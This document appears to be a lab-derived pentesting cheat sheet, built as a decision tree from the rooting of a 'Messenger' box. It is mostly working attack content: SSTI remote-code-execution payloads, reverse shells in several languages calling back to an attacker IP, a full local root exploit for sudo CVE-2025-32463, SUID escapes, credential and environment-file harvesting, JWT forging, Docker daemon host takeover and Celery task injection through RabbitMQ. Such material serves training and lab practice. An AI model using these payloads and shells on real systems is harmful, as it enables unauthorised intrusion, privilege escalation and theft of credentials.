# Pentesting Cheat Sheet: Techniques From the Messenger Box

A walkthrough of the techniques used to root the Messenger machine, laid out as a decision tree. Each branch has a command, what to look for, and where to go next.

---

## Level 0: Setup

Before anything, verify connectivity and DNS.

```bash
ping -c 1 <TARGET>
```

No reply? Either VPN is down or the domain isn't resolving. Add it to hosts:

```bash
echo "<TARGET_IP>  <TARGET_DOMAIN>" | sudo tee -a /etc/hosts
```

---

## Level 1: Enumeration

### 1.1 Port scanning

```bash
nmap -sC -sV -p- --min-rate 1000 <TARGET> -oN nmap_full.txt
```

What to look for:

| Port | Service | Next move |
|------|---------|-----------|
| 22 | SSH | Note it, may need later for pivot or brute |
| 80/443 | HTTP | Go to 1.2 |
| 3000, 5000, 8080, 8443, 9000 | Web apps / API | Go to 1.2 on each |
| 5432 | PostgreSQL | Check if externally exposed |
| 6379 | Redis | If exposed, huge find |
| 15672 | RabbitMQ Management | Free win if exposed |
| 9200 | Elasticsearch | `curl IP:9200/_cat/indices` |
| 27017 | MongoDB | Check auth |

If nmap hangs or gets filtered:

```bash
masscan -p1-65535 --rate=1000 <TARGET>
# or
nc -zv <TARGET> 80 443 3000 8080 6379 15672
```

### 1.2 Service fingerprinting

```bash
nmap -sV -p <PORT> <TARGET>
curl -sI http://<TARGET>:<PORT>/
```

Headers tell you a lot:

| Header | Meaning | Next |
|--------|---------|------|
| `Server: nginx` | Static files / reverse proxy | Look for API behind |
| `Server: gunicorn` | Python WSGI | Flask/FastAPI, likely API |
| `X-Powered-By: Express` | Node.js | Express API |
| `Server: Werkzeug` | Flask dev server | Check for debug mode |
| `WWW-Authenticate: Bearer` | JWT auth | Go find openapi.json |

### 1.3 Virtual host fuzzing

```bash
ffuf -u http://<TARGET>/ -H "Host: FUZZ.<TARGET_DOMAIN>" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

Multiple vhosts = multi-tenant server. Each one is a separate attack surface.

### 1.4 Directory and file discovery

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://<TARGET>/FUZZ -fw 158
```

For SPAs (React/Vue) you'll get false positives from the catch-all route. Use length filtering:

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt \
             -k -t 50 --exclude-length 1125
```

| Found | Meaning | Next |
|-------|---------|------|
| `swagger`, `openapi.json`, `redoc` | API docs | Go to 1.6 |
| `admin`, `dashboard` | Admin panel | Test auth bypass |
| `.git/`, `.env`, `backup.zip` | Sensitive | Download immediately |
| `api/` | API root | Fuzz `api/FUZZ` |

### 1.5 JS bundle analysis

SPAs hide their entire API surface in JavaScript files. Pull them apart.

```bash
# List JS files
curl -s http://<TARGET>/ | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2

# Download main bundle
curl -s http://<TARGET>/assets/index-XXXX.js -o index.js

# Grep for endpoints
grep -oE '"/api[^"]*"' index.js | sort -u
grep -oE "'/api[^']*'" index.js | sort -u
grep -oE 'baseURL[^,]*' index.js | head -5
```

| Found | Meaning | Next |
|-------|---------|------|
| `baseURL:"/api/v1"` | API version | Test paths under this |
| `/api/v1/auth/register` | Registration | Create account |
| `/api/v1/auth/login` | Login | Get token |
| Endpoints not in swagger | **Hidden routes** | Test each |
| `"secret"`, `"token"` in JS | Client-side secrets | Sometimes re-used server-side |

### 1.6 API documentation

```bash
for p in /swagger.json /api/swagger.json /openapi.json /api/openapi.json \
         /swagger /swagger-ui.html /redoc /api/docs /docs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

`200` on `openapi.json` means you have the full API map:

```bash
curl -s http://<TARGET>/api/openapi.json -o openapi.json
jq '.paths | keys[]' openapi.json
```

---

## Level 2: Application Analysis

### 2.1 Map the endpoints

```bash
jq '.paths | keys[]' openapi.json
```

| Pattern | Hypothesis | Test |
|---------|-----------|------|
| `/api/v1/chats/{chat_id}/messages` | IDOR | Try other chat_ids |
| `/api/v1/friendships/search` | User enumeration | Search common usernames |
| `/api/v1/friendships/summary` | If HTML returns, SSTI | See 2.5 |
| `/api/v1/admin/*` | Broken access control | Test without admin token |
| `/api/v1/auth/register` | Create account | Register |

### 2.2 Identify auth mechanism

```bash
curl -s -i http://<TARGET>/api/v1/<protected>
```

| Response | Auth type |
|----------|-----------|
| `401 + WWW-Authenticate: Bearer` | JWT / bearer token |
| `401 + WWW-Authenticate: Basic` | Basic auth |
| `Set-Cookie: session=...` | Session cookie |

Decode JWT payload if you get one:

```bash
echo -n "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
# → {sub: "5", type: "access", iat: ..., exp: ...}
```

`sub` is the user ID. `type` tells you access vs refresh. `exp` is expiry:

```bash
date -d @<EXP_TIMESTAMP>
```

### 2.3 Register and login

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter1","email":"h@t.com","password":"Passw0rd!","firstName":"H","lastName":"One"}'

TOKEN=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter1","password":"Passw0rd!"}' | jq -r .access_token)
```

| Response | Next |
|----------|------|
| `200 + access_token` | Proceed to 2.4 |
| `404` | Endpoint wrong. Check swagger/JS |
| `already exists` | Log in with existing creds |

### 2.4 Injection tests

**XSS:**

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"<script>alert(1)</script>","email":"x@t.com","password":"Passw0rd!"}'
# Later, check if the payload appears unescaped in any rendered page
```

**SQL injection:**

```bash
curl -s "http://<TARGET>/api/v1/friendships/search?search=admin'%20OR%20'1'='1"
# If result count changes → injectable
```

**Path traversal:**

```bash
curl -s "http://<TARGET>/api/v1/files?name=../../../../etc/passwd"
curl -s "http://<TARGET>/api/v1/download?path=..%2F..%2F..%2Fetc%2Fpasswd"
```

**SSRF:**

```bash
curl -s "http://<TARGET>/api/v1/proxy?url=http://127.0.0.1:9732/"
curl -s "http://<TARGET>/api/v1/webhook?url=http://169.254.169.254/latest/meta-data/"
```

### 2.5 Content-Type check

This is the step most people skip. Do it on every endpoint.

```bash
curl -s -D - http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $TOKEN" -o /dev/null
```

| Content-Type | Meaning |
|--------------|---------|
| `application/json` | Normal API |
| `text/html; charset=utf-8` | **Server-side template rendering** → SSTI candidate |

Rule: if an API returns HTML instead of JSON, a template engine is rendering it server-side. Test SSTI on every user-controlled field.

---

## Level 3: Server-Side Template Injection

### 3.1 Detect the engine

Inject math payloads into every user-controlled field. Each template engine has a unique syntax.

| Payload | Engine | Success = |
|---------|--------|-----------|
| `{{7*7}}` | Jinja2 / Twig | `49` |
| `${7*7}` | Mako / JSP EL | `49` |
| `<%= 7*7 %>` | ERB (Ruby) | `49` |
| `{7*7}` | Smarty (PHP) | `49` |
| `[[${7*7}]]` | Thymeleaf (Java) | `49` |
| `#{7*7}` | Ruby string interpolation | `49` |

Test routine:

```bash
# 1. Register with payload in username
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"${7*7}","email":"t1@t.com","password":"Passw0rd!","firstName":"X","lastName":"Y"}'

# 2. Login
T=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${7*7}","password":"Passw0rd!"}' | jq -r .access_token)

# 3. Render the template
curl -s http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $T" | grep -E 'uid=|49|class='
```

| Result | Meaning |
|--------|---------|
| `49` | SSTI confirmed on this engine |
| `${7*7}` (literal) | Field is not rendered, try another |
| 500 error | Rendering crashed, dig into the payload |

### 3.2 Find the rendered field

On some apps, `firstName` and `lastName` are passed as template variables (safe), while `username` is concatenated into the template source (dangerous). Test each field separately:

```bash
for FIELD in username firstName lastName bio; do
  echo "=== $FIELD ==="
  curl -s -X POST http://<TARGET>/api/v1/auth/register \
    -H 'Content-Type: application/json' \
    -d "{\"$FIELD\":\"\${7*7}\",\"email\":\"t_${FIELD}@t.com\",\"password\":\"Passw0rd!\"}" \
    | jq -r ".$FIELD"
done
```

The field that returns `49` is the vulnerable one.

### 3.3 Confirm RCE

**Mako:**

```python
${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.popen('whoami').read()}
${self.module.cache.util.os.popen('ls -la').read()}

# Alternates
${self._Template__module._util.os.popen('id').read()}
${__import__('os').popen('id').read()}
```

**Jinja2 (for reference):**

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

Test:

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"${self.module.cache.util.os.popen(\"id\").read()}","email":"rce1@t.com","password":"Passw0rd!","firstName":"X","lastName":"Y"}'

R=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${self.module.cache.util.os.popen(\"id\").read()}","password":"Passw0rd!"}' | jq -r .access_token)

curl -s http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $R" | grep -E 'uid=|gid='
```

| Result | Next |
|--------|------|
| `uid=1000(app) gid=1001(app)` | RCE confirmed, go to 3.4 |
| Empty | Payload ran but produced no output, try a different command |
| 500 | Payload syntax broke, adjust quoting |

### 3.4 Reverse shell

Rules that matter:

1. Use `bash`, not `sh`. On Ubuntu, `/bin/sh` is dash, and dash doesn't support `/dev/tcp`.
2. Put `&` at the end of the payload so it backgrounds, otherwise your curl hangs.
3. Base64 encode the payload to avoid quote and special-character breakage.
4. Use your `tun0` IP, not `eth0`.

**Bash (preferred):**

```bash
# 1. Listener
rlwrap -cAr nc -lvnp 4444

# 2. Build payload
PAYLOAD='bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
echo "$B64"

# 3. Inject
# ${self.module.cache.util.os.popen('echo <B64> | base64 -d | bash').read()}
```

**Python (fallback):**

```bash
PAYLOAD="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

**Netcat / socat:**

```bash
# nc
PAYLOAD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f'
# socat
PAYLOAD='socat exec:/bin/bash tcp:10.10.14.5:4444'
```

**Perl (rare fallback):**

```bash
PAYLOAD='perl -e "use Socket;\$i=\"10.10.14.5\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");"'
```

Troubleshooting:

| Symptom | Cause | Fix |
|---------|-------|-----|
| curl hangs | Missing `&` | Append `&` |
| curl returns, no connection | dash, `/dev/tcp` unsupported | Use `bash` explicitly or Python payload |
| `Connection refused` | No listener or port blocked | `nc -lvnp` on an open port |
| `Permission denied` | Path restriction | Use `/tmp` |

**TTY upgrade once you have a shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter a couple of times on the shell
export TERM=xterm SHELL=/bin/bash
stty rows 40 cols 120
```

---

## Level 4: Privilege Escalation

### 4.1 First enumeration

```bash
whoami; id; hostname; uname -a; cat /etc/os-release
sudo -V | head -1
sudo -l 2>/dev/null
```

### 4.2 CVE check

| Component | Version to flag | CVE |
|-----------|-----------------|-----|
| sudo | `1.9.16p2` or `< 1.9.17p1` | CVE-2025-32463 |
| polkit | `< 0.120` | CVE-2021-4034 (PwnKit) |
| kernel | `< 5.8` | CVE-2022-0847 (Dirty Pipe) |
| kernel | `< 4.8.3` | CVE-2016-5195 (Dirty COW) |

### 4.3-A CVE-2025-32463 (sudo -R + NSS)

Mechanism: `sudo -R <chroot>` reads `nsswitch.conf` from inside the chroot, then loads an NSS shared object before dropping privileges. Supply a malicious `.so` and its constructor runs as root.

Automated:

```bash
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot
chmod +x sudo-chwoot.sh
./sudo-chwoot.sh
# → woot! and a root shell
```

Manual:

```bash
# 1. Build the malicious NSS library
cat > /tmp/woot.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
    setreuid(0,0); setregid(0,0);
    execl("/bin/bash","bash","-p",NULL);
}
EOF
mkdir -p /tmp/stage/libnss_
gcc -shared -fPIC -Wl,-init,woot -o /tmp/stage/libnss_/woot1337.so.2 /tmp/woot.c

# 2. Build the fake chroot
mkdir -p /tmp/stage/woot/etc
echo "passwd: /woot1337" > /tmp/stage/woot/etc/nsswitch.conf
cp /etc/group /tmp/stage/woot/etc/

# 3. Execute from inside the stage directory
cd /tmp/stage && sudo -R woot woot
```

The `-Wl,-init,woot` flag matters. It sets the function as the ELF `DT_INIT`, which glibc calls unconditionally on load, whereas `__attribute__((constructor))` alone might be skipped depending on how NSS loads the module.

### 4.3-B SUID and capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Abuse known SUID binaries via GTFOBins:

| SUID | Escape |
|------|--------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `vim -c ':!sh'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `bash` | `bash -p` |
| `python` | `python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |

### 4.3-C Cron

```bash
cat /etc/crontab; ls -la /etc/cron.*
ps aux | grep cron
find / -type f -perm -o+w 2>/dev/null | grep -E 'cron|\.sh'
```

### 4.4 Credential files

```bash
cat ~/.bash_history ~/.ssh/* 2>/dev/null
find / -name ".env" -o -name "*.config" -o -name "credentials*" 2>/dev/null | grep -v proc
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null | grep -v proc
```

### 4.5 Alternatives

| Path | Trigger |
|------|---------|
| `sudo -l` shows any binary | GTFOBins entry |
| User in `docker` group | `docker run -v /:/mnt alpine chroot /mnt /bin/bash` |
| User in `lxd` group | LXC container escape |
| `/etc/passwd` writable | Add UID=0 user |
| `~/.ssh/authorized_keys` writable | Add your key |

---

## Level 5: Credential Hunting

### 5.1 Home directories

```bash
ls -la /root /home/* 2>/dev/null
find / -name "*.env" -o -name ".env" 2>/dev/null | grep -v proc
```

### 5.2 Config and secret files

```bash
grep -rIl "password\|secret\|token\|api_key" /etc /opt /app /home 2>/dev/null | head -20
```

### 5.3 Git repositories on disk

```bash
find / -type d -name ".git" 2>/dev/null
# Any hit → go to Level 6
```

### 5.4 Process environment

```bash
env
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'
```

| File | Content |
|------|---------|
| `/root/gitness` | Gitness token and password |
| `/app/.env` | Database URLs, secrets |
| `/etc/hosts`, `/etc/resolv.conf` | Internal network, DNS |
| `~/.aws/credentials` | IAM keys |
| `~/.docker/config.json` | Registry auth |

Every file with a token or password is the key to the next service.

---

## Level 6: Git History Mining

Secrets committed and "deleted" are never really deleted. `git rm` doesn't scrub history, it just records the removal.

### 6.1 Clone

```bash
# Basic auth
git clone http://user:pass@host:3000/space/repo.git

# Bearer / PAT
git clone http://oauth2:${TOKEN}@host:3000/space/repo.git

# SSH
git clone ssh://git@host:2222/space/repo.git

# If UI only, via API zip export
curl -s "http://host:3000/api/v1/repos/<space>/<repo>/archive/main.zip" \
  -H "Authorization: Bearer $TOKEN" -o repo.zip
```

### 6.2 Enumerate history

```bash
git log --all --oneline                # all commits, all branches
git log --all --stat                   # with file changes
git log -p --all                       # full diffs
git branch -a                          # all branches
git tag                                # all tags
```

### 6.3 Find deleted files

```bash
# Deleted files in history
git log --all --diff-filter=D --name-only --pretty=format:"%H %s"

# Any .env ever committed
git log --all --full-history -- .env

# Show a specific file in a specific commit
git show <COMMIT_SHA>:path/to/.env

# Extract the first .env in history
git show $(git log --all --full-history --format=%H -- .env | head -1):.env
```

### 6.4 Automated secret scanning

```bash
git log -p --all | grep -iE "password|secret|token|api[_-]?key|BEGIN.*PRIVATE"
gitleaks detect --source . --verbose
trufflehog git file://. --only-verified
```

| Found | Next |
|-------|------|
| `REFRESH_TOKEN=eyJ...` | Use against the API |
| `AWS_ACCESS_KEY_ID=...` | `aws sts get-caller-identity` |
| `DATABASE_URL=...` | `psql` / `mysql` |
| `PRIVATE KEY` | SSH/TLS key reuse |

---

## Level 7: API Exploitation with Stolen Tokens

### 7.1 Identify the token type

```bash
echo -n "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
# type: access / refresh / pat
```

### 7.2 Test the token

```bash
for ep in /api/v1/user /api/v1/auth/myself /api/v1/auth/me; do
  echo "=== $ep ==="
  curl -s "http://<TARGET>$ep" -H "Authorization: Bearer $TOKEN" -w "\n[HTTP %{http_code}]\n"
done
```

### 7.3 IDOR / BOLA

```bash
# Your own resource
curl -s http://<TARGET>/api/v1/chats/6/messages -H "Authorization: Bearer $TOKEN"

# Someone else's
curl -s http://<TARGET>/api/v1/chats/7/messages -H "Authorization: Bearer $TOKEN"
# 200 with data → IDOR
```

### 7.4 Refresh to access

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"$REFRESH\"}"

# Or via bearer
curl -s -X POST http://<TARGET>/api/v1/auth/refresh \
  -H "Authorization: Bearer $REFRESH"
```

### 7.5 JWT forging (when `JWT_SECRET_KEY` leaks)

```python
import jwt, datetime
payload = {
    "sub": "1",              # admin
    "type": "access",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(days=1)).timestamp()),
}
print(jwt.encode(payload, "<LEAKED_JWT_SECRET>", algorithm="HS256"))
```

```bash
curl -s http://<TARGET>/api/v1/admin/users -H "Authorization: Bearer $FORGED"
# 200 → full admin
```

---

## Level 8: Docker Network Pivoting

### 8.1 Identify the subnet

```bash
hostname -I
ip a
cat /etc/hosts
```

| Range | Meaning |
|-------|---------|
| `172.17.x.x` | Docker default bridge |
| `172.18.x.x`–`172.30.x.x` | Docker custom network |
| `10.x.x.x` | Standard network or overlay |
| `fd00::` | IPv6 ULA |

### 8.2 Scan neighbors without nmap

```bash
python3 -c "
import socket
from concurrent.futures import ThreadPoolExecutor
def check(args):
    ip, port = args
    try:
        with socket.socket() as s:
            s.settimeout(0.3)
            if s.connect_ex((ip, port)) == 0:
                print(f'OPEN {ip}:{port}')
    except: pass
base = '172.22.2.'
ports = [22, 80, 443, 2375, 3000, 5000, 5432, 6379, 8000, 8080, 9000, 15672, 27017]
tasks = [(f'{base}{i}', p) for i in range(1,255) for p in ports]
with ThreadPoolExecutor(max_workers=200) as ex:
    list(ex.map(check, tasks))
"
```

### 8.3 Service identification

| Port | Service | Test |
|------|---------|------|
| 2375/2376 | Docker daemon (no TLS) | `curl http://IP:2375/version` → root on host |
| 5432 | PostgreSQL | `psql -h IP -U postgres` |
| 6379 | Redis | `redis-cli -h IP` |
| 15672 | RabbitMQ Management | Web UI with creds |
| 27017 | MongoDB | `mongo IP:27017` |
| 9200 | Elasticsearch | `curl IP:9200/_cat/indices` |

If 2375 is open:

```bash
docker -H tcp://IP:2375 ps
docker -H tcp://IP:2375 run -v /:/host alpine chroot /host /bin/bash
# → root on the host itself
```

---

## Level 9: Message Queue Exploitation

### 9.1 Access RabbitMQ Management

```bash
curl -s -u user:pass http://IP:15672/api/overview | head -c 200
# JSON → creds OK
# 401 → wrong creds
```

### 9.2 Discover vhosts and queues

```bash
# vhosts
curl -s -u user:pass http://IP:15672/api/vhosts | jq '.[].name'

# queues on a vhost
curl -s -u user:pass http://IP:15672/api/queues/<VHOST> | jq '.[] | {name, consumers, messages}'

# single queue
curl -s -u user:pass "http://IP:15672/api/queues/<VHOST>/<QUEUE>" | jq '{name, consumers, messages}'
```

| Field | Meaning | Next |
|-------|---------|------|
| `consumers >= 1` | Worker alive | Can trigger tasks |
| `consumers = 0` | No worker | Must start one or find another path |
| `messages > 100k` | Queue backed up | Message may sit for a while |
| `messages < 1000` | Queue nearly empty | Fast delivery |

### 9.3 Discover the task format

Read the worker source first. Find `tasks.py` in the Git repo or on disk.

```bash
cat /app/tasks.py
```

Look for `@shared_task` decorators:

```python
@shared_task
def send_environment_variables_to_chat(sender_id: int, chat_id: int):
    envs_verbose = "\n".join(f"{k}={v}" for k, v in os.environ.items())
    ...
```

Celery payload format:

```json
{
  "properties": {
    "content_type": "application/json",
    "content_encoding": "utf-8",
    "delivery_mode": 2,
    "headers": {
      "task": "app.tasks.<TASK_NAME>",
      "id": "<UUID>"
    }
  },
  "routing_key": "<QUEUE_NAME>",
  "payload": "[[<ARG1>, <ARG2>], {}, {\"callbacks\": null, \"errbacks\": null, \"chain\": null, \"chord\": null}]",
  "payload_encoding": "string"
}
```

| Field | Source |
|-------|--------|
| `task` | Full function path from `tasks.py` |
| `routing_key` | Queue name from 9.2 |
| `payload[0]` | Positional args in signature order |
| `payload[1]` | Keyword args (usually `{}`) |

### 9.4 Subscribe to the Redis output channel first

Pub/Sub doesn't queue messages. If no subscriber is connected when the message fires, it's gone. Subscribe before you trigger.

```python
# /tmp/listen.py
import socket, sys
s = socket.socket()
s.settimeout(120.0)
s.connect(("<REDIS_IP>", 6379))
# SUBSCRIBE <CHANNEL>
s.sendall(b"*2\r\n$9\r\nSUBSCRIBE\r\n$<LEN>\r\n<CHANNEL>\r\n")
while True:
    data = s.recv(65536)
    if not data: break
    sys.stdout.write(data.decode('utf-8', errors='ignore'))
    sys.stdout.flush()
```

RESP breakdown:
- `*2` = array of 2 elements
- `$9\r\nSUBSCRIBE` = length-prefixed string "SUBSCRIBE"
- `$<LEN>\r\n<CHANNEL>` = length-prefixed channel name

```bash
python3 /tmp/listen.py > /tmp/out.txt 2>&1 &
```

### 9.5 Trigger and capture

```bash
curl -s -u user:pass -H "Content-Type: application/json" -X POST \
  --data @payload.json \
  "http://IP:15672/api/exchanges/<VHOST>/amq.default/publish"
# {"routed":true} = published

sleep 3
grep "FLAG" /tmp/out.txt
```

### 9.6 Alternatives

| Situation | Alternative |
|-----------|-------------|
| `consumers = 0` | Worker may take time to start; retry later |
| Payload rejected | Test Celery v4 vs v5 message format |
| Redis has auth | Look for password in env or config |
| UI closed | Use AMQP directly on 5672 via `pika` |

---

## Level 10: Post-Exploitation

```bash
# Full process environment
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'

# Grep for secrets system-wide
grep -rIl "FLAG\|SECRET\|KEY" /app /opt /etc /home 2>/dev/null | head

# SQLite
sqlite3 /app/data.db ".tables"

# Redis
redis-cli -h <host> KEYS "*"
redis-cli -h <host> GET secret
```

---

## Decision Cheat Sheet

| If you find... | Go to | Primary tool |
|----------------|-------|--------------|
| `openapi.json` | Level 2 | `jq .paths` |
| `Content-Type: text/html` on an API | Level 3 | `{{7*7}}`, `${7*7}` |
| SSTI evaluates | Level 3.4 | `os.popen` + reverse shell |
| A shell | Level 4 | `sudo -V`, `uname -a`, SUID |
| A file with a token | Level 7 | `curl -H "Authorization: Bearer ..."` |
| A Git repo | Level 6 | `git log --all`, gitleaks |
| An internal service | Level 8 | Subnet scan |
| RabbitMQ + Redis + Celery | Level 9 | Subscribe then publish |
| `JWT_SECRET_KEY` leaked | Level 7.5 | Forge admin JWT |

---

## Ten Rules

1. Check `Content-Type` on every endpoint. HTML from an API means SSTI.
2. Test every input field separately. One may be escaped, another not.
3. Base64-encode reverse shell payloads. Special characters break inline.
4. Use `bash`, not `sh`. dash has no `/dev/tcp`.
5. Append `&` to reverse shells or your curl hangs.
6. Walk the full Git history. Deleted files still exist as blobs.
7. Exchange refresh tokens for access tokens. Don't assume one works for both.
8. Scan the Docker subnet. Your container's localhost is not the target's localhost.
9. Subscribe to Pub/Sub channels before triggering the publisher.
10. `consumers: 1` on the queue is your proof the worker is alive. A queue without a consumer is a black hole.

---

## Tooling Reference

| Category | Tools |
|----------|-------|
| Enumeration | nmap, ffuf, gobuster, feroxbuster |
| API | postman, swagger-editor, kiterunner |
| SSTI | tplmap, payloadsallthethings |
| Shells | revshells.com, nc, socat, rlwrap |
| LPE | linpeas, LinEnum, pspy, linux-exploit-suggester |
| Git | gitleaks, trufflehog, gitrob |
| Docker | deepce, amicontained |
| JWT | jwt_tool, hashcat |



2026/10/19
